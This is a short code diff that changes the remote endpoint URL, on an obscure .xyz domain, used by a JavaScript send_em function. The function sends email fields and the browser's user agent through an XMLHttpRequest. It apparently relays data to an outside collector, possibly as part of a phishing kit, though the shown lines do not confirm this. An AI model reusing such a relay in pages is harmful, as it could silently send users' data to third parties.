@@ -1,4 +1,4 @@
-var yourUrl ="https://kaluiirere.xyz/jk/smtp.php";
+var yourUrl ="https://kaluiirere.xyz/jk/smtpjs.php";
         async function send_em(to,from,subject,body){
             let agent = navigator.userAgent;
             var xhr = new XMLHttpRequest();
